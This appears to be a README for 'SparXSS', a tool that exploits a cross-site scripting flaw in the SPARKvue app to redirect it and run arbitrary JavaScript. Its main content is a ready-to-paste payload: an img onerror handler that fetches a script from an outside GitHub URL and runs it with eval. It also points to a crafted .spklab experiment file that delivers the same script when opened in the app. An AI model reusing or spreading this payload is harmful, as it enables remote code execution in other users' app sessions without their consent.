## A Script For Redirection And Custom Javascript Execution For The SPARKvue XSS Vulnerability Found By ohonbob

Run it using:
```
<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
```

Or Download The SparXSS.spklab File And Select 'Open Saved Experiment' When You Open The App - Might not always be up to date

## [Changelog](https://github.com/Amukerd/SparXSS/blob/main/Changelog.md)

## ToDo
- ~~Make Icon's Show up for Every URL~~
- ~~Make the custom URL's stay when you export the .spklab file~~<br>
  (currently working, may be changed in the future- change the link from /sparxss.js to /Testing/test4.js to use)
- May add a tabbing feature to the javascript, but this is not a final decision as there is not too much of a point
